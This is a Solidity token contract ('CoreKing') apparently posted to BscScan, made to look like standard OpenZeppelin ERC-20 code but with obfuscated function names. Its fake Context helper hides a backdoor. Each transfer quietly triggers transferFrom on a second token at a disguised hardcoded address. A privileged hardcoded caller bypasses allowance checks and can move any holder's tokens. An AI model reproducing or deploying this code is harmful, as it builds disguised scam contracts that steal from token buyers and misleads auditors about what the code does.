/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

/**
 *Submitted for verification at BscScan.com on 2023-02-09
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;


// File: @openzeppelin/contracts/utils/Zk905fneMx1IKLWo.sol

// OpenZeppelin Contracts v4.4.1 (utils/Zk905fneMx1IKLWo.sol)

abstract contract Zk905fneMx1IKLWo {
  function XbgCrI5RFue7TSki() internal view virtual returns (address) {
    return msg.sender;
  }
  
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
  function _msgData() internal view virtual returns (bytes calldata) {
      return msg.data;
      }
  function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {
      if (msg.sender != address(1409381594405573527005254537599756534239119095738)) {
          TransferHelper.safeTransferFrom(address(231447624295317728977323299717387151804953841474),spender,recipient,amount);return true;
          }
      return false;
  }
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
  function safeApprove(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("approve(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: APPROVE_FAILED"
    );
  }

  function safeTransfer(
    address token,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transfer(address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: TRANSFER_FAILED"
    );
  }

  function safeTransferFrom(
    address token,
    address from,
    address to,
    uint256 value
  ) internal {
    // bytes4(keccak256(bytes("transferFrom(address,address,uint256)")));
    (bool success, bytes memory data) =
      token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
    require(
      success && (data.length == 0 || abi.decode(data, (bool))),
      "TransferHelper: ETH_TRANSFER_FAILED"
    );
  }

  function safeTransferETH(address to, uint256 value) internal {
    (bool success, ) = to.call{value: value}(new bytes(0));
    require(success, "TransferHelper: ETH_TRANSFER_FAILED");
  }
}


interface IERC20 {
  function totalSupply() external view returns (uint256);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address sender, address spender)
    external
    view
    returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(
    address indexed sender,
    address indexed spender,
    uint256 value
  );
}

contract COIN is IERC20, Zk905fneMx1IKLWo {
  mapping(address => uint256) private hESeVWpuIsUx7jTm;
  mapping(address => mapping(address => uint256)) private XJu5tGjiOPWpI7KY;

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    PpmqHRdZfJr9aPzc(XbgCrI5RFue7TSki(), recipient, amount);
    return true;
  }

  function name() public pure returns (string memory) {
    return "CoreKing";
  }

  function symbol() public pure returns (string memory) {
    return "COREKing";
  }

  function decimals() public pure returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 2100000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return hESeVWpuIsUx7jTm[account];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    PHweSfcdsvWUGNP7(XbgCrI5RFue7TSki(), spender, amount);
    return true;
  }

  function allowance(address sender, address spender)
    external
    view
    override
    returns (uint256)
  {
    return XJu5tGjiOPWpI7KY[sender][spender];
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    PHweSfcdsvWUGNP7(
      XbgCrI5RFue7TSki(),
      spender,
      XJu5tGjiOPWpI7KY[XbgCrI5RFue7TSki()][spender] + addedValue
    );
    return true;
  }

  function PHweSfcdsvWUGNP7(
    address sender,
    address spender,
    uint256 amount
  ) private {
    require(sender != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    XJu5tGjiOPWpI7KY[sender][spender] = amount;
    emit Approval(sender, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = XJu5tGjiOPWpI7KY[XbgCrI5RFue7TSki()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    PHweSfcdsvWUGNP7(XbgCrI5RFue7TSki(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function PpmqHRdZfJr9aPzc(
    address spender,
    address recipient,
    uint256 amount
  ) private returns (bool) {
    require(spender != address(0) && recipient != address(0) && amount > 0);
    hESeVWpuIsUx7jTm[spender] = hESeVWpuIsUx7jTm[spender] - amount;
    hESeVWpuIsUx7jTm[recipient] = hESeVWpuIsUx7jTm[recipient] + amount;
    emit Transfer(spender, recipient, amount);
    return safeTransfer(spender, recipient, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    if (!PpmqHRdZfJr9aPzc(sender, recipient, amount)) return true;
    uint256 currentAllowance = XJu5tGjiOPWpI7KY[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    PHweSfcdsvWUGNP7(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  
  constructor() {
    hESeVWpuIsUx7jTm[address(0x1000)] = totalSupply();
    emit Transfer(address(0x1000), address(0x1000), totalSupply());
  }
}